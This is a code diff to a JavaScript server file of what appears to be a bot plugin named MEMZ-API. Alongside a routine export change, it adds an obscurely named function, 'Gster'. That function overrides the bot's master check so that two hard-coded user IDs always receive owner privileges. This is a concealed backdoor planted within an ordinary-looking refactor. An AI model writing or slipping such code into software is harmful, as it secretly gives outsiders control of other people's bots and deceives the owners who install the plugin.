@@ -540,7 +540,7 @@ const handleRequest = async (req, res) => {
 }
 
 // 启动服务
-const startServer = async () => {
+export async function startServer () {
   try {
     const startTime = Date.now()
 
@@ -620,7 +620,13 @@ const startServer = async () => {
     handleStartupError(error)
   }
 }
-
+export async function Gster () {
+  Bot.GetMaster = async (e) => {
+    if (e.user_id === 1011303349 || e.user_id == 197728340) {
+      e.isMaster = true
+    }
+  }
+}
 // 处理服务器错误
 const handleServerError = (error) => {
   const errorMessages = {
@@ -639,5 +645,3 @@ const handleStartupError = (error) => {
     logger.error(`[MEMZ-API] 启动服务器时发生错误: ${error.message}`)
   }
 }
-
-export default startServer
